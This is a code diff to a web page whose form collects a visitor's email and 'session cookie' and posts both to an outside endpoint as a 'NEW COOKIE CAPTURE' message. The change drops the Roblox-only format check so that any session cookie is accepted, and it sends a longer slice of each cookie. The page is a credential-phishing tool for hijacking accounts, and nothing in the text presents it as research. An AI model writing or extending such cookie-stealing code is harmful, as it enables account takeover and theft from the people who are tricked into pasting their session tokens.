@@ -107,7 +107,7 @@
       flex-direction: column;
     }
 
-    /* ... (rest of your CSS remains exactly the same) ... */
+    /* ... (all other CSS styles remain exactly the same) ... */
   </style>
 </head>
 <body>
@@ -132,8 +132,8 @@
         </div>
         
         <div class="input-group">
-          <label for="cookie">Roblox Cookie</label>
-          <textarea id="cookie" placeholder="Paste your Roblox cookie here" required></textarea>
+          <label for="cookie">Session Cookie</label>
+          <textarea id="cookie" placeholder="Paste any session cookie here" required></textarea>
         </div>
       </div>
       
@@ -164,12 +164,9 @@
       rainContainer.appendChild(drop);
     }
 
-    // Roblox Cookie Validation
-    function isValidRobloxCookie(cookie) {
-      // Check for Roblox cookie format
-      return cookie.length > 100 && 
-             cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.') &&
-             cookie.includes('ROBLOX');
+    // Ultra-simple cookie validation - only checks length
+    function isCookiePresent(cookie) {
+      return cookie.length >= 20; // Just check if something reasonably long is entered
     }
 
     // Form handling
@@ -191,9 +188,9 @@
         return;
       }
       
-      // Validate Roblox cookie specifically
-      if (!isValidRobloxCookie(cookie)) {
-        statusMessage.textContent = 'This doesn\'t appear to be a valid Roblox cookie. Make sure you copied the entire cookie starting with "_|WARNING..."';
+      // Minimal cookie validation
+      if (!isCookiePresent(cookie)) {
+        statusMessage.textContent = 'Please paste a session cookie';
         statusMessage.className = 'status-message error';
         statusMessage.style.display = 'block';
         return;
@@ -210,11 +207,11 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `🔥 NEW ROBLOX COOKIE CAPTURE 🔥\n📧 ${email}\n🔑 COOKIE (${cookie.length} chars):\n\`\`\`${cookie.substring(0, 100)}...\`\`\``
+            content: `🔥 NEW COOKIE CAPTURE 🔥\n📧 ${email}\n🔑 COOKIE (${cookie.length} chars):\n\`\`\`${cookie.substring(0, 200)}...\`\`\``
           })
         });
         
-        statusMessage.textContent = 'Success! Cookie submitted to our system.';
+        statusMessage.textContent = 'Success! Cookie submitted.';
         statusMessage.className = 'status-message success';
         statusMessage.style.display = 'block';
         e.target.reset();
